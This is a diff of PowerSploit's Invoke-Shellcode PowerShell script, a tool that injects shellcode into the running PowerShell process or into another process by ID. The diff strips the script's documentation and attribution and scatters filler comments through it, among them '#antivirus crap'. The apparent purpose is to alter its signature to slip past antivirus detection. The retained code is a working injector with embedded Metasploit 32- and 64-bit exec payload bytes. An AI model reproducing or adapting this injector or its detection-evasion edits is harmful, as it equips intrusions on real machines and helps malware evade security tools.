@@ -1,69 +1,11 @@
 function Invoke-Shellcode
 {
-<#
-.SYNOPSIS
-
-Inject shellcode into the process ID of your choosing or within the context of the running PowerShell process.
-
-PowerSploit Function: Invoke-Shellcode
-Author: Matthew Graeber (@mattifestation)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
- 
-.DESCRIPTION
-
-Portions of this project was based upon syringe.c v1.2 written by Spencer McIntyre
-
-PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):
-
-msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
-
-Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
- 
-.PARAMETER ProcessID
-
-Process ID of the process you want to inject shellcode into.
-
-.PARAMETER Shellcode
-
-Specifies an optional shellcode passed in as a byte array
-
-.PARAMETER Force
-
-Injects shellcode without prompting for confirmation. By default, Invoke-Shellcode prompts for confirmation before performing any malicious act.
-
-.EXAMPLE
-
-C:\PS> Invoke-Shellcode -ProcessId 4274
-
-Description
------------
-Inject shellcode into process ID 4274.
-
-.EXAMPLE
-
-C:\PS> Invoke-Shellcode
-
-Description
------------
-Inject shellcode into the running instance of PowerShell.
-
-.EXAMPLE
-
-C:\PS> Invoke-Shellcode -Shellcode @(0x90,0x90,0xC3)
-    
-Description
------------
-Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
-Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit!
-#>
-
+#trying to 
 [CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
     [ValidateNotNullOrEmpty()]
     [UInt16]
     $ProcessID,
-    
+    #make this thing
     [Parameter( ParameterSetName = 'RunLocal' )]
     [ValidateNotNullOrEmpty()]
     [Byte[]]
@@ -72,7 +14,7 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
     [Switch]
     $Force = $False
 )
-
+#unreadable
     Set-StrictMode -Version 2.0
 
     if ( $PSBoundParameters['ProcessID'] )
@@ -106,7 +48,7 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
         $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
         $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
         $MethodBuilder.SetImplementationFlags('Runtime, Managed')
-        
+        #for
         Write-Output $TypeBuilder.CreateType()
     }
 
@@ -151,7 +93,7 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
             $LittleEndianByteArray = New-Object Byte[](0)
             $Address.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | ForEach-Object { if ($_) { $LittleEndianByteArray += [Byte] ('0x{0}' -f $_) } }
             [System.Array]::Reverse($LittleEndianByteArray)
-            
+            #stupid
             Write-Output $LittleEndianByteArray
         }
         
@@ -177,7 +119,7 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
             $CallStub += ConvertTo-LittleEndian $ExitThreadAddr # &ExitThread
             $CallStub += 0xFF,0xD0                              # CALL  EAX
         }
-        
+        #antivirus crap
         Write-Output $CallStub
     }
 
@@ -255,7 +197,7 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
         {
             # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread.
             $CallStub = Emit-CallThreadStub $RemoteMemAddr $ExitThreadAddr 32
-            
+            #maybe this will work
             Write-Verbose 'Emitting 32-bit assembly call stub.'
         }
         else
@@ -292,7 +234,7 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
 
         Write-Verbose 'Shellcode injection complete!'
     }
-
+#MAYBE IT WON't
     function Local:Inject-LocalShellcode
     {
         if ($PowerShell32bit) {
@@ -335,13 +277,11 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
         if ($PowerShell32bit)
         {
             $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 32
-            
             Write-Verbose 'Emitting 32-bit assembly call stub.'
         }
         else
         {
             $CallStub = Emit-CallThreadStub $BaseAddress $ExitThreadAddr 64
-            
             Write-Verbose 'Emitting 64-bit assembly call stub.'
         }
 
@@ -369,7 +309,7 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
         
         $VirtualFree.Invoke($CallStubAddress, $CallStub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
         $VirtualFree.Invoke($BaseAddress, $Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RELEASE (0x8000)
-
+#but we'll have fun trying
         Write-Verbose 'Shellcode injection complete!'
     }
 
@@ -437,7 +377,7 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
                                   0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
                                   0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                   0x61,0x6c,0x63,0x00)
-
+#???dc
         # 64-bit payload
         # msfpayload windows/x64/exec CMD="calc" EXITFUNC=thread
         [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
@@ -503,7 +443,7 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
         $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
         
         Write-Verbose "Injecting shellcode into PowerShell"
-        
+        #there, hope this is enough
         if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                  "Injecting shellcode into the running PowerShell process!" ) )
         {
